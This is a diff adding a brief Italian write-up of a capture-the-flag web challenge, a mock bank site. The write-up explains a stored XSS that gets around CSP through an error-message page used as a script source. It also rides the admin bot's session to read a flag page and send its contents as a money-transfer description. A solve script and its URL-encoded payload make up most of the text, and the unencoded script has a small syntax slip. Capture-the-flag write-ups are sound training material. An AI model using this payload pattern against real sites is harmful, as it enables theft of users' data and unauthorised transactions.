@@ -1,0 +1,27 @@
+In questa challenge c'è una vunlerabilità xss pero con delle protezioni come le csp e le cors.
+Per aggirare questi controlli possiamo trovare una pagina ossia "/error/?msg=" che ci permette di inserire qualsiasi cosa al suo interno e usarlo come src del tag script 
+che poi manderemo nella causale della transazione. In riusciamo a aggirare le csp. Per aggirare le cors invece facciamo fare una richiesta all'admin alla pagina di "/history/1" (che contiene la flag) il cui contenuto verrà poi mandato come causale a una transazione che facciamo fare all'admin a noi.
+
+solve script:
+
+<script src="/error/?msg=fetch('http://virtualbank.challs.olicyber.it/history/1').then((res) => res.text()).then((res) => await fetch('http://virtualbank.challs.olicyber.it/sendmoney', {
+    'credentials': 'include',
+    'headers': {
+        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Upgrade-Insecure-Requests': '1',
+        'Priority': 'u=0, i'
+    },
+    'referrer': 'http://virtualbank.challs.olicyber.it/sendmoney',
+    'body': 'to=cacacaca&amount=1&description=' + res,
+    'method': 'POST',
+    'mode': 'cors'
+});"></script>
+
+URL ENCODED:
+
+<script src="/error/?msg=fetch(%27http%3A%2F%2Fvirtualbank.challs.olicyber.it%2Fhistory%2F1%27).then(res%3D%3Eres.text()).then(res%3D%3Efetch(%27http%3A%2F%2Fvirtualbank.challs.olicyber.it%2Fsendmoney%27%2C%7Bcredentials%3A%27include%27%2Cheaders%3A%7B%27User-Agent%27%3A%27Mozilla%2F5.0%20(X11%3B%20Ubuntu%3B%20Linux%20x86_64%3B%20rv%3A136.0)%20Gecko%2F20100101%20Firefox%2F136.0%27%2C%27Accept%27%3A%27text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2C*%2F*%3Bq%3D0.8%27%2C%27Accept-Language%27%3A%27en-US%2Cen%3Bq%3D0.5%27%2C%27Content-Type%27%3A%27application%2Fx-www-form-urlencoded%27%2C%27Upgrade-Insecure-Requests%27%3A%271%27%2C%27Priority%27%3A%27u%3D0%2C%20i%27%7D%2Creferrer%3A%27http%3A%2F%2Fvirtualbank.challs.olicyber.it%2Fsendmoney%27%2Cbody%3A%27to%3Dcacacaca%26amount%3D1%26description%3D%27%2Bres%2Cmethod%3A%27POST%27%2Cmode%3A%27cors%27%7D))%3B%0A"></script>
+
+Per finire facciamo visitare la transazione fatta da noi all'admin dalla pagina "/jobs"
